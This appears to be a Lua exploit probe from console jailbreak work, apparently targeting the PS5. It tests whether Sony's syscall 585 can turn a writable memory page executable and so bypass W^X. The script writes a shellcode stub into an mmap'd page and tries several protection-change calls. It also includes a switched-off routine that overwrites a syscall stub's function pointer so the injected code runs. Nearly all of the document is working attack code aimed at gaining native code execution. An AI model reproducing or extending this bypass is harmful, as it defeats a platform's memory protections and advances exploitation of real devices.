-- CRASH_CLASS: HIGH (changing memory protections, may crash)
-- PROBE 43h: sceKernelMtypeprotect (585) — W^X bypass attempt
--
-- Probe 42f showed syscall 585 returns success (ret=1).
-- This is Sony's custom memory protection syscall.
-- If it can make RW pages executable, W^X is dead.
--
-- Strategy:
--   1. Allocate RW page via mmap
--   2. Write known machine code (e.g., "mov eax, 0x41414141; ret")
--   3. Call mtypeprotect to change to RX
--   4. Attempt to execute the page via ROP chain fn_addr redirect
--
-- If execution succeeds: arbitrary native code execution, no ROP needed.

print("=== PROBE 43h: MTYPEPROTECT W^X BYPASS ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function qw_hex(v)
    if type(v) == "table" and v.h then
        return string.format("%08X_%08X", v.h, v.l)
    end
    return string.format("%08X", to_num(v))
end

local sc_getpid = make_syscall(20)
local sc_mmap = make_syscall(477)
local sc_munmap = make_syscall(588)
local sc_mprotect = make_syscall(74)
local sc_mtypeprotect = make_syscall(585)

local pid = 0
pcall(function() pid = to_num(sc_getpid()) end)
print("pid: " .. pid)

--------------------------------------------------------------------
-- A) Allocate RW page
--------------------------------------------------------------------
print("")
print("=== A: ALLOCATE RW PAGE ===")
local page_size = 0x4000  -- 16KB PS5 page
local rw_page
pcall(function()
    rw_page = sc_mmap(uint64(0), uint64(page_size), uint64(3), -- PROT_READ|PROT_WRITE
        uint64(0x1002), uint64(0xFFFFFFFF), uint64(0)) -- MAP_ANON|MAP_PRIVATE
end)
if not rw_page then print("MMAP FAILED"); return end
print("RW page at: " .. qw_hex(rw_page))

-- Write shellcode: mov eax, 0x41414141; ret
-- B8 41 41 41 41 C3
safe_wd(rw_page, 0x414141B8)     -- mov eax, 0x41414141 (first 4 bytes)
safe_wd(rw_page + 4, 0x000000C3) -- ret + padding (41 from prev + C3)
-- Actually let's be precise:
-- Byte 0: B8, Byte 1-4: 41414141, Byte 5: C3
memory.write_byte(rw_page, 0xB8)       -- mov eax, imm32
memory.write_byte(rw_page + 1, 0x41)
memory.write_byte(rw_page + 2, 0x41)
memory.write_byte(rw_page + 3, 0x41)
memory.write_byte(rw_page + 4, 0x41)
memory.write_byte(rw_page + 5, 0xC3)   -- ret

-- Verify written
local b0 = safe_rd(rw_page) or 0
print(string.format("  shellcode: %08X", b0))

--------------------------------------------------------------------
-- B) Try mtypeprotect with various protection flags
--------------------------------------------------------------------
print("")
print("=== B: MTYPEPROTECT CALLS ===")
do
    -- Try different protection values
    -- PROT_READ=1, PROT_WRITE=2, PROT_EXEC=4
    local prots = {
        {val = 5, name = "RX (READ|EXEC)"},
        {val = 7, name = "RWX (READ|WRITE|EXEC)"},
        {val = 4, name = "X (EXEC only)"},
    }

    for _, p in ipairs(prots) do
        -- mtypeprotect signature is unknown — try common patterns:
        -- mtypeprotect(addr, len, prot)
        -- mtypeprotect(addr, len, old_type, new_type)

        -- Pattern 1: (addr, len, prot)
        local ok, ret = pcall(function()
            return sc_mtypeprotect(uint64(rw_page), uint64(page_size), uint64(p.val))
        end)
        local rv = ok and to_num(ret) or -999
        print(string.format("  mtypeprotect(%s, 3-arg): ret=%d", p.name, rv))

        -- Pattern 2: (addr, len, old_prot, new_prot)
        ok, ret = pcall(function()
            return sc_mtypeprotect(uint64(rw_page), uint64(page_size),
                uint64(3), uint64(p.val))
        end)
        rv = ok and to_num(ret) or -999
        print(string.format("  mtypeprotect(%s, 4-arg): ret=%d", p.name, rv))
    end

    -- Also try standard mprotect for comparison
    local ok, ret = pcall(function()
        return sc_mprotect(uint64(rw_page), uint64(page_size), uint64(5))
    end)
    local rv = ok and to_num(ret) or -999
    print(string.format("  mprotect(RX): ret=%d (expected -1)", rv))
end

--------------------------------------------------------------------
-- C) Check if page protection actually changed
-- Try reading the page (should still work if RX or RWX)
--------------------------------------------------------------------
print("")
print("=== C: VERIFY PAGE STATE ===")
do
    local val = safe_rd(rw_page)
    print(string.format("  read after mtypeprotect: %s", val and string.format("%08X", val) or "SEGFAULT"))

    -- Try writing (should fail if changed to RX)
    local write_ok = safe_wd(rw_page + 0x100, 0xDEADBEEF)
    print(string.format("  write after mtypeprotect: %s", write_ok and "OK (still writable)" or "FAILED (now RX?)"))

    local wrote = safe_rd(rw_page + 0x100)
    print(string.format("  verify write: %s", wrote and string.format("%08X", wrote) or "unreadable"))
end

--------------------------------------------------------------------
-- D) If mtypeprotect seemed to work, try executing via ROP redirect
-- (Only if we're confident the page is executable)
--------------------------------------------------------------------
print("")
print("=== D: EXECUTION TEST (via ROP fn_addr redirect) ===")
do
    -- Get fn_addr pointer
    local pipe_str = tostring(syscall.pipe)
    local fn_str = pipe_str:match("fcall_stub%.fn_addr: (0x[0-9a-fA-F]+)")

    if fn_str then
        local fn_ptr = uint64(fn_str)

        -- Allocate GPU to reach fn_addr
        local gpu_size = 512 * 0x4000
        local gpu_addr
        pcall(function()
            gpu_addr = sc_mmap(uint64(0), uint64(gpu_size), uint64(0x33),
                uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
        end)

        if gpu_addr then
            local fn_orig = safe_rq(fn_ptr)
            if fn_orig then
                print("  fn_addr original: " .. qw_hex(fn_orig))
                print("  shellcode page: " .. qw_hex(rw_page))
                print("")
                print("  NOTE: Not executing automatically.")
                print("  To test: overwrite fn_addr with shellcode page address,")
                print("  then call any syscall. If mtypeprotect worked,")
                print("  the shellcode runs. If not, it crashes.")
                print("")
                print("  Set EXECUTE_TEST=true in probe to attempt.")

                local EXECUTE_TEST = false
                if EXECUTE_TEST then
                    print("  ATTEMPTING EXECUTION...")
                    safe_wq(fn_ptr, rw_page)
                    local ok, ret = pcall(function()
                        return sc_getpid()
                    end)
                    local rv = ok and to_num(ret) or -999
                    print(string.format("  result: ok=%s ret=%d", tostring(ok), rv))
                    if ok and rv == 0x41414141 then
                        print("  *** NATIVE CODE EXECUTION ACHIEVED ***")
                    end
                    -- Restore
                    safe_wq(fn_ptr, fn_orig)
                end
            end
            pcall(function() sc_munmap(gpu_addr, uint64(gpu_size)) end)
        end
    else
        print("  could not parse fn_addr")
    end
end

-- Cleanup
pcall(function() sc_munmap(rw_page, uint64(page_size)) end)

print("")
print("=== PROBE 43h COMPLETE ===")
